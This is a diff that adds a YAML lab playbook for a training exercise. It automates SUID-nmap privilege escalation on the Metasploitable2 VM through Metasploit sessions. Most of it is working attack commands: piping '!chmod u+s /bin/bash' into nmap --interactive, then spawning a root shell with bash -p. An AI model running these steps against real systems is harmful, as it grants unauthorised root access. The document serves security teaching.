@@ -1,0 +1,69 @@
+# Phase 4.5: Privilege Escalation - SUID Binary Abuse (nmap --interactive)
+#
+# Background: Metasploitable2 ships with /usr/bin/nmap owned by root with the
+# SUID bit set (-rwsr-xr-x). When a SUID binary runs, the process inherits the
+# file owner's effective UID (root), not the calling user's UID. nmap's
+# --interactive mode accepts !<command> to run OS commands. Because the effective
+# UID is root, those commands also run as root.
+#
+# Steps:
+#   1. Find SUID binaries to confirm nmap is present
+#   2. Use nmap --interactive to set the SUID bit on /bin/bash
+#   3. Run /bin/bash -p to get a root shell (-p preserves effective UID)
+#
+# Variables required: $SESSION_NAME (must point to an interactive shell session)
+# ATT&CK: T1548.001 (Abuse Elevation Control Mechanism: Setuid and Setgid)
+#
+# IMPORTANT: If $SESSION_NAME is a raw reverse shell (non-interactive), upgrade it first.
+# See upgrade_shell.yml from the day 2 examples (set UPGRADESESSION = $SESSION_NAME).
+#
+# CLEANUP: Run 'chmod u-s /bin/bash' before ending the session.
+
+commands:
+  # Show current privilege level before escalation
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: id
+
+  - type: debug
+    cmd: "Before escalation: $RESULT_STDOUT"
+
+  # Confirm nmap is present and has the SUID bit (look for the 's' in -rwsr-xr-x)
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: ls -la /usr/bin/nmap
+
+  # TODO: Use nmap's SUID + interactive mode to set the SUID bit on /bin/bash.
+  # The printf trick pipes commands non-interactively into nmap --interactive.
+  # Command to run: echo $'!chmod u+s /bin/bash\nexit\n' | nmap --interactive
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: echo $'!chmod u+s /bin/bash\nexit\n' | nmap --interactive
+    metadata:
+      tactic: "TA0004"
+      technique: "T1548.001"
+      technique_name: "Abuse Elevation Control Mechanism: Setuid and Setgid"
+
+  # Verify the SUID bit is now set on /bin/bash (look for -rwsr-xr-x)
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: ls -la /bin/bash
+
+  # TODO: Run /bin/bash -p to spawn a root shell and confirm euid=0.
+  # -p (privileged) prevents bash from dropping the effective UID.
+  # Expected output: uid=1001(daemon) euid=0(root) or similar
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: /bin/bash -p
+
+  - type: msf-session
+    session: $SESSION_NAME
+    cmd: id
+
+  - type: debug
+    cmd: "After escalation: $RESULT_STDOUT"
+
+  # CLEANUP: uncomment to remove the SUID bit from /bin/bash after the exercise
+  # - type: msf-session
+  #   session: $SESSION_NAME
+  #   cmd: /bin/bash -p -c "chmod u-s /bin/bash"
